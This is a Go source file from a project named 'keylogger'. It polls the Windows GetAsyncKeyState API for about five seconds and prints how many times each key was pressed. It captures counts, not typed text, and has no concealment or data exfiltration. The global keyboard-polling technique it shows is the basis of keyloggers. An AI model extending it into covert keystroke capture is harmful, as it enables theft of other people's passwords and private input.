package main

import (
	"fmt"
	"syscall"
	"time"

	"keylogger/keylogger/keyboard"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

func main() {
	// sleep at the beginning to get rid of some initial erroneous data
	time.Sleep(2 * time.Second)

	// stores active keys from most recent cycle
	var CurrentlyActiveKeys [103]bool
	for c := 0; c < 500; c++ {
		// start := time.Now()
		for _, key := range keyboard.Keys {
			ret, _, _ := getAsyncKeyState.Call(uintptr(key))
			if uint16(ret) != 0 {
				CurrentlyActiveKeys[keyboard.KeyIndex[key]] = true
			} else {
				CurrentlyActiveKeys[keyboard.KeyIndex[key]] = false
			}
		}

		for i := 0; i < keyboard.NumKeys; i++ {
			if CurrentlyActiveKeys[i] && !keyboard.IsKeyActive[i] {
				keyboard.IsKeyActive[i] = true
			} else if !CurrentlyActiveKeys[i] && keyboard.IsKeyActive[i] {
				keyboard.IsKeyActive[i] = false
				keyboard.TimesPressed[i]++
			}
		}
		// total := time.Since(start)
		// fmt.Println(total)

		// doesn't need to be running constantly
		time.Sleep(10 * time.Millisecond)
		// break
	}

	for i, tp := range keyboard.TimesPressed {
		fmt.Printf("%#x: %d\n", keyboard.Keys[i], tp)
	}
}
